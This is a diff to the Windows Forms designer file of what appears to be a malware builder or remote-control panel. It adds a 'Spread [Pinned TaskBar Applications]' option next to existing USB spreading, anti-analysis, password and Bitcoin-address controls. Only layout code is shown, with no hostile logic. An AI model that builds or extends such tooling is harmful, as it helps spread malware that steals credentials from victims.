@@ -54,6 +54,8 @@ Partial Class Form1
         Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
         Me.NotifyIcon1 = New System.Windows.Forms.NotifyIcon(Me.components)
         Me.Flag = New System.Windows.Forms.ImageList(Me.components)
+        Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
+        Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
         Me.MAIN_TAB = New Server_0._5.CHTabcontrol()
         Me.TabPage1 = New System.Windows.Forms.TabPage()
         Me.PictureBox1 = New System.Windows.Forms.PictureBox()
@@ -83,6 +85,7 @@ Partial Class Form1
         Me.ChSeparator1 = New Server_0._5.CHSeparator()
         Me.ChButton1 = New Server_0._5.CHButton()
         Me.ChGroupBox3 = New Server_0._5.CHGroupBox()
+        Me.PIN_CHK = New Server_0._5.CHCheckbox()
         Me.Label7 = New System.Windows.Forms.Label()
         Me.BTC_ADDR = New Server_0._5.CHTextbox()
         Me.ANTI = New Server_0._5.CHCheckbox()
@@ -177,7 +180,7 @@ Partial Class Form1
         Me.DetailsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
         Me.DetailsToolStripMenuItem.Name = "DetailsToolStripMenuItem"
         Me.DetailsToolStripMenuItem.Size = New System.Drawing.Size(229, 30)
-        Me.DetailsToolStripMenuItem.Text = "Details"
+        Me.DetailsToolStripMenuItem.Text = "System Info"
         '
         'PasswordsToolStripMenuItem
         '
@@ -572,6 +575,12 @@ Partial Class Form1
         Me.Flag.Images.SetKeyName(241, "zw.png")
         Me.Flag.Images.SetKeyName(242, "--.png")
         '
+        'BackgroundWorker1
+        '
+        '
+        'BackgroundWorker2
+        '
+        '
         'MAIN_TAB
         '
         Me.MAIN_TAB.Controls.Add(Me.TabPage1)
@@ -775,7 +784,7 @@ Partial Class Form1
         Me.ChGroupBox4.Name = "ChGroupBox4"
         Me.ChGroupBox4.NoRounding = False
         Me.ChGroupBox4.Sizable = True
-        Me.ChGroupBox4.Size = New System.Drawing.Size(169, 241)
+        Me.ChGroupBox4.Size = New System.Drawing.Size(169, 270)
         Me.ChGroupBox4.SmartBounds = True
         Me.ChGroupBox4.StartPosition = System.Windows.Forms.FormStartPosition.Manual
         Me.ChGroupBox4.TabIndex = 10
@@ -810,7 +819,7 @@ Partial Class Form1
         Me.ChSeparator1.Customization = ""
         Me.ChSeparator1.Font = New System.Drawing.Font("Verdana", 8.0!)
         Me.ChSeparator1.Image = Nothing
-        Me.ChSeparator1.Location = New System.Drawing.Point(25, 346)
+        Me.ChSeparator1.Location = New System.Drawing.Point(25, 377)
         Me.ChSeparator1.Name = "ChSeparator1"
         Me.ChSeparator1.NoRounding = False
         Me.ChSeparator1.Size = New System.Drawing.Size(1383, 23)
@@ -823,7 +832,7 @@ Partial Class Form1
         Me.ChButton1.Customization = "AGQA/wD/AP8AgAD/"
         Me.ChButton1.Font = New System.Drawing.Font("Verdana", 8.0!)
         Me.ChButton1.Image = Nothing
-        Me.ChButton1.Location = New System.Drawing.Point(25, 281)
+        Me.ChButton1.Location = New System.Drawing.Point(25, 305)
         Me.ChButton1.Name = "ChButton1"
         Me.ChButton1.NoRounding = False
         Me.ChButton1.Size = New System.Drawing.Size(1383, 54)
@@ -835,6 +844,7 @@ Partial Class Form1
         '
         Me.ChGroupBox3.BackColor = System.Drawing.Color.Black
         Me.ChGroupBox3.BorderStyle = System.Windows.Forms.FormBorderStyle.None
+        Me.ChGroupBox3.Controls.Add(Me.PIN_CHK)
         Me.ChGroupBox3.Controls.Add(Me.Label7)
         Me.ChGroupBox3.Controls.Add(Me.BTC_ADDR)
         Me.ChGroupBox3.Controls.Add(Me.ANTI)
@@ -847,7 +857,7 @@ Partial Class Form1
         Me.ChGroupBox3.Name = "ChGroupBox3"
         Me.ChGroupBox3.NoRounding = False
         Me.ChGroupBox3.Sizable = True
-        Me.ChGroupBox3.Size = New System.Drawing.Size(371, 241)
+        Me.ChGroupBox3.Size = New System.Drawing.Size(371, 270)
         Me.ChGroupBox3.SmartBounds = True
         Me.ChGroupBox3.StartPosition = System.Windows.Forms.FormStartPosition.Manual
         Me.ChGroupBox3.TabIndex = 7
@@ -855,12 +865,23 @@ Partial Class Form1
         Me.ChGroupBox3.TransparencyKey = System.Drawing.Color.Empty
         Me.ChGroupBox3.Transparent = False
         '
+        'PIN_CHK
+        '
+        Me.PIN_CHK.BackColor = System.Drawing.Color.Transparent
+        Me.PIN_CHK.Checked = False
+        Me.PIN_CHK.ForeColor = System.Drawing.Color.Black
+        Me.PIN_CHK.Location = New System.Drawing.Point(19, 148)
+        Me.PIN_CHK.Name = "PIN_CHK"
+        Me.PIN_CHK.Size = New System.Drawing.Size(349, 14)
+        Me.PIN_CHK.TabIndex = 7
+        Me.PIN_CHK.Text = "Spread [Pinned TaskBar Applications]"
+        '
         'Label7
         '
         Me.Label7.AutoSize = True
         Me.Label7.BackColor = System.Drawing.Color.Black
         Me.Label7.ForeColor = System.Drawing.Color.Lime
-        Me.Label7.Location = New System.Drawing.Point(19, 154)
+        Me.Label7.Location = New System.Drawing.Point(16, 187)
         Me.Label7.Name = "Label7"
         Me.Label7.Size = New System.Drawing.Size(205, 18)
         Me.Label7.TabIndex = 10
@@ -874,7 +895,7 @@ Partial Class Form1
         Me.BTC_ADDR.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Server_0._5.My.MySettings.Default, "BTC", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
         Me.BTC_ADDR.Font = New System.Drawing.Font("Verdana", 8.0!)
         Me.BTC_ADDR.Image = Nothing
-        Me.BTC_ADDR.Location = New System.Drawing.Point(19, 180)
+        Me.BTC_ADDR.Location = New System.Drawing.Point(19, 217)
         Me.BTC_ADDR.MaxCharacters = 0
         Me.BTC_ADDR.Name = "BTC_ADDR"
         Me.BTC_ADDR.NoRounding = False
@@ -889,7 +910,7 @@ Partial Class Form1
         Me.ANTI.BackColor = System.Drawing.Color.Transparent
         Me.ANTI.Checked = False
         Me.ANTI.ForeColor = System.Drawing.Color.Black
-        Me.ANTI.Location = New System.Drawing.Point(19, 106)
+        Me.ANTI.Location = New System.Drawing.Point(19, 63)
         Me.ANTI.Name = "ANTI"
         Me.ANTI.Size = New System.Drawing.Size(214, 14)
         Me.ANTI.TabIndex = 8
@@ -900,11 +921,11 @@ Partial Class Form1
         Me.USB_CHK.BackColor = System.Drawing.Color.Transparent
         Me.USB_CHK.Checked = False
         Me.USB_CHK.ForeColor = System.Drawing.Color.Black
-        Me.USB_CHK.Location = New System.Drawing.Point(19, 62)
+        Me.USB_CHK.Location = New System.Drawing.Point(19, 106)
         Me.USB_CHK.Name = "USB_CHK"
         Me.USB_CHK.Size = New System.Drawing.Size(214, 14)
         Me.USB_CHK.TabIndex = 7
-        Me.USB_CHK.Text = "USB Spread"
+        Me.USB_CHK.Text = "Spread [USB]"
         '
         'ChGroupBox2
         '
@@ -925,7 +946,7 @@ Partial Class Form1
         Me.ChGroupBox2.Name = "ChGroupBox2"
         Me.ChGroupBox2.NoRounding = False
         Me.ChGroupBox2.Sizable = True
-        Me.ChGroupBox2.Size = New System.Drawing.Size(371, 241)
+        Me.ChGroupBox2.Size = New System.Drawing.Size(371, 270)
         Me.ChGroupBox2.SmartBounds = True
         Me.ChGroupBox2.StartPosition = System.Windows.Forms.FormStartPosition.Manual
         Me.ChGroupBox2.TabIndex = 5
@@ -1045,7 +1066,7 @@ Partial Class Form1
         Me.ChGroupBox1.Name = "ChGroupBox1"
         Me.ChGroupBox1.NoRounding = False
         Me.ChGroupBox1.Sizable = True
-        Me.ChGroupBox1.Size = New System.Drawing.Size(371, 241)
+        Me.ChGroupBox1.Size = New System.Drawing.Size(371, 270)
         Me.ChGroupBox1.SmartBounds = True
         Me.ChGroupBox1.StartPosition = System.Windows.Forms.FormStartPosition.Manual
         Me.ChGroupBox1.TabIndex = 4
@@ -1233,4 +1254,7 @@ Partial Class Form1
     Friend WithEvents DROP As CHOnOffBox
     Friend WithEvents ToolStripStatusLabel2 As ToolStripStatusLabel
     Friend WithEvents ToolStripStatusLabel3 As ToolStripStatusLabel
+    Friend WithEvents PIN_CHK As CHCheckbox
+    Friend WithEvents BackgroundWorker1 As System.ComponentModel.BackgroundWorker
+    Friend WithEvents BackgroundWorker2 As System.ComponentModel.BackgroundWorker
 End Class
